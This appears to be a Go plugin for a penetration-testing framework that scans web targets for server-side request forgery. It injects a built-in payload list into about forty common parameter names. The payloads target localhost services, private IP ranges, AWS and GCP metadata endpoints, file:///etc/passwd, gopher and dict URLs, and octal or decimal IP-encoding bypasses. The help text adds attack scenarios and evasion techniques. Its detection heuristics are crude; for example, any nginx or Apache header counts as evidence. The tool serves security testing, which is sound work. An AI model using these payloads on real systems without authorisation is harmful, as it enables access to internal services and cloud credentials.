// internal/modules/web_vulnerabilities/ssrf_scanner.go
package web_vulnerabilities

import (
	"apexPenetrateGo/internal/core"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type SSRFResult struct {
	Target          string
	Vulnerable      bool
	TestedParams    []string
	Vulnerabilities []SSRFVuln
	Note            string
}

type SSRFVuln struct {
	Parameter    string
	Payload      string
	URL          string
	ResponseTime time.Duration
	StatusCode   int
	Evidence     string
}

// Common SSRF parameters
var ssrfParams = []string{
	"url", "uri", "link", "src", "source", "target", "dest", "destination",
	"file", "path", "document", "folder", "root", "pg", "style", "pdf",
	"template", "php_path", "doc", "page", "name", "cat", "dir", "action",
	"board", "date", "detail", "download", "prefix", "include", "inc", "locate",
	"show", "site", "type", "view", "content", "layout", "mod", "conf",
}

// SSRF payloads for different targets
var ssrfPayloads = []string{
	// Local network scanning
	"http://127.0.0.1:80",
	"http://127.0.0.1:22",
	"http://127.0.0.1:3306",
	"http://127.0.0.1:6379",
	"http://127.0.0.1:8080",
	"http://localhost:80",
	"http://0.0.0.0:80",
	"http://0:80",

	// Internal network
	"http://192.168.1.1",
	"http://10.0.0.1",
	"http://172.16.0.1",

	// AWS metadata
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal/computeMetadata/v1/",

	// File protocol
	"file:///etc/passwd",
	"file:///c:/windows/system32/drivers/etc/hosts",
	"file://localhost/etc/passwd",

	// Different protocols
	"gopher://127.0.0.1:80",
	"dict://127.0.0.1:11211",
	"ftp://127.0.0.1",

	// DNS rebinding
	"http://localtest.me",
	"http://customer1.app.localhost.nip.io",

	// Bypass attempts
	"http://127.1",
	"http://0177.0.0.1",   // Octal
	"http://2130706433",   // Decimal
	"http://017700000001", // Octal full
	"http://127.000.000.1",
}

func SSRFScan(target string, customParams []string, customPayloads []string) *SSRFResult {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	params := ssrfParams
	if len(customParams) > 0 {
		params = append(params, customParams...)
	}

	payloads := ssrfPayloads
	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	result := &SSRFResult{
		Target:          target,
		TestedParams:    params,
		Vulnerabilities: []SSRFVuln{},
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := buildSSRFTestURL(target, param, payload)

			start := time.Now()
			resp, err := client.Get(testURL)
			duration := time.Since(start)

			if err != nil {
				// Some errors might indicate SSRF (timeouts, etc.)
				if strings.Contains(err.Error(), "timeout") && duration > 10*time.Second {
					result.Vulnerabilities = append(result.Vulnerabilities, SSRFVuln{
						Parameter:    param,
						Payload:      payload,
						URL:          testURL,
						ResponseTime: duration,
						StatusCode:   0,
						Evidence:     "Timeout - possible SSRF to internal service",
					})
					result.Vulnerable = true
				}
				continue
			}
			defer resp.Body.Close()

			// Analyze response for SSRF indicators
			evidence := analyzeSSRFResponse(resp, payload, duration)
			if evidence != "" {
				result.Vulnerabilities = append(result.Vulnerabilities, SSRFVuln{
					Parameter:    param,
					Payload:      payload,
					URL:          testURL,
					ResponseTime: duration,
					StatusCode:   resp.StatusCode,
					Evidence:     evidence,
				})
				result.Vulnerable = true
			}
		}
	}

	if result.Vulnerable {
		result.Note = fmt.Sprintf("Found %d potential SSRF vulnerabilities", len(result.Vulnerabilities))
	} else {
		result.Note = "No SSRF vulnerabilities detected"
	}

	return result
}

func buildSSRFTestURL(baseURL, param, payload string) string {
	if strings.Contains(baseURL, "?") {
		return fmt.Sprintf("%s&%s=%s", baseURL, param, url.QueryEscape(payload))
	}
	return fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(payload))
}

func analyzeSSRFResponse(resp *http.Response, payload string, duration time.Duration) string {
	// Long response times might indicate internal network access
	if duration > 5*time.Second {
		return "Long response time - possible internal network access"
	}

	// Different status codes might indicate successful internal requests
	switch resp.StatusCode {
	case 200:
		if strings.Contains(payload, "169.254.169.254") {
			return "HTTP 200 to AWS metadata endpoint"
		}
		if strings.Contains(payload, "127.0.0.1") || strings.Contains(payload, "localhost") {
			return "HTTP 200 to localhost"
		}
	case 500:
		return "HTTP 500 - possible server error from internal request"
	case 502, 503, 504:
		return fmt.Sprintf("HTTP %d - possible gateway error from internal request", resp.StatusCode)
	}

	// Check response headers for internal service indicators
	server := resp.Header.Get("Server")
	if server != "" {
		if strings.Contains(strings.ToLower(server), "nginx") ||
			strings.Contains(strings.ToLower(server), "apache") ||
			strings.Contains(strings.ToLower(server), "tomcat") {
			return "Internal server header detected: " + server
		}
	}

	return ""
}

func (r *SSRFResult) String() string {
	status := "🔒"
	if r.Vulnerable {
		status = "🚨"
	}

	msg := fmt.Sprintf("\n%s SSRF Scanner for %s:\n", status, r.Target)
	msg += fmt.Sprintf("  Tested %d parameters with %d payloads\n", len(r.TestedParams), len(ssrfPayloads))

	if r.Vulnerable {
		msg += fmt.Sprintf("  🚨 VULNERABLE: Found %d potential SSRF issues:\n", len(r.Vulnerabilities))
		for i, vuln := range r.Vulnerabilities {
			msg += fmt.Sprintf("    %d. Parameter: %s\n", i+1, vuln.Parameter)
			msg += fmt.Sprintf("       Payload: %s\n", vuln.Payload)
			msg += fmt.Sprintf("       Status: %d\n", vuln.StatusCode)
			msg += fmt.Sprintf("       Response Time: %v\n", vuln.ResponseTime)
			msg += fmt.Sprintf("       Evidence: %s\n", vuln.Evidence)
			msg += fmt.Sprintf("       Test URL: %s\n", vuln.URL)
		}
	} else {
		msg += "  ✅ No SSRF vulnerabilities found\n"
	}

	msg += fmt.Sprintf("  Note: %s\n", r.Note)
	return msg
}

type ssrfPlugin struct{}

func (p *ssrfPlugin) Name() string { return "SSRFScanner" }
func (p *ssrfPlugin) Description() string {
	return "Scans for Server-Side Request Forgery (SSRF) vulnerabilities"
}
func (p *ssrfPlugin) Category() string { return "web-vuln" }
func (p *ssrfPlugin) Options() []core.ModuleOption {
	return []core.ModuleOption{
		{Name: "params", Type: "string", Default: "", Description: "Comma-separated custom SSRF parameters", Required: false},
		{Name: "payloads", Type: "string", Default: "", Description: "Comma-separated custom payloads", Required: false},
		{Name: "timeout", Type: "string", Default: "15s", Description: "HTTP request timeout", Required: false},
		{Name: "check_aws", Type: "bool", Default: true, Description: "Include AWS metadata payloads", Required: false},
		{Name: "check_internal", Type: "bool", Default: true, Description: "Include internal network payloads", Required: false},
	}
}
func (p *ssrfPlugin) Run(target string, options map[string]interface{}) (interface{}, error) {
	var customParams []string
	var customPayloads []string

	if params, ok := options["params"].(string); ok && params != "" {
		customParams = strings.Split(params, ",")
		for i := range customParams {
			customParams[i] = strings.TrimSpace(customParams[i])
		}
	}

	if payloads, ok := options["payloads"].(string); ok && payloads != "" {
		customPayloads = strings.Split(payloads, ",")
		for i := range customPayloads {
			customPayloads[i] = strings.TrimSpace(customPayloads[i])
		}
	}

	return SSRFScan(target, customParams, customPayloads), nil
}

func (p *ssrfPlugin) Help() string {
	return `
🔗 SSRF Scanner - Server-Side Request Forgery Vulnerability Detector

DESCRIPTION:
  Detects Server-Side Request Forgery (SSRF) vulnerabilities where applications make
  requests to attacker-controlled URLs, potentially accessing internal systems.

USAGE:
  ssrf <target_url> [options]

OPTIONS:
  params    - Comma-separated list of parameters to test (url,file,image,etc.)
  payloads  - Comma-separated list of SSRF payloads to test

EXAMPLES:
  ssrf https://example.com/upload
  ssrf https://example.com --params url,file,image
  ssrf https://example.com --payloads http://169.254.169.254,file:///etc/passwd

VULNERABLE PARAMETERS:
  • URL Parameters: url, uri, link, src, href, redirect
  • File Parameters: file, path, document, image, avatar
  • API Parameters: webhook, callback, api_url, endpoint

ATTACK SCENARIOS:
  • Cloud Metadata: Access AWS/Azure/GCP metadata services
  • Internal Network: Scan internal services and databases
  • File System: Read local files via file:// protocol
  • Port Scanning: Enumerate internal network services

SSRF PAYLOADS:
  • AWS Metadata: http://169.254.169.254/latest/meta-data/
  • Azure Metadata: http://169.254.169.254/metadata/instance
  • GCP Metadata: http://metadata.google.internal/computeMetadata/v1/
  • Local Files: file:///etc/passwd, file:///windows/system32/drivers/etc/hosts
  • Internal IPs: http://127.0.0.1, http://192.168.1.1, http://10.0.0.1

EVASION TECHNIQUES:
  • IP Encoding: http://0x7f000001 (hex), http://2130706433 (decimal)
  • Domain Bypass: Use redirect services or URL shorteners
  • Protocol Bypass: ftp://, dict://, gopher://, ldap://
  • DNS Rebinding: evil.com that resolves to internal IPs
  • IPv6: http://[::1] for localhost

PRO TIPS:
  💡 Test different protocols (http, https, ftp, file, dict, gopher)
  💡 Check response time differences for internal vs external requests
  💡 Look for error messages revealing internal network structure
  💡 Test with cloud metadata endpoints specific to platform
  💡 Use Burp Collaborator or similar for blind SSRF detection
  💡 Check for partial response reflection indicating successful requests

DETECTION METHODS:
  • Time-based: Measure response delays for internal requests
  • Error-based: Analyze error messages for internal service responses
  • Content-based: Look for reflected internal service responses
  • Out-of-band: Use external services to detect blind SSRF

RISK LEVEL: High to Critical (internal network access, data exposure)
`
}

func init() {
	core.RegisterPlugin(&ssrfPlugin{})
}
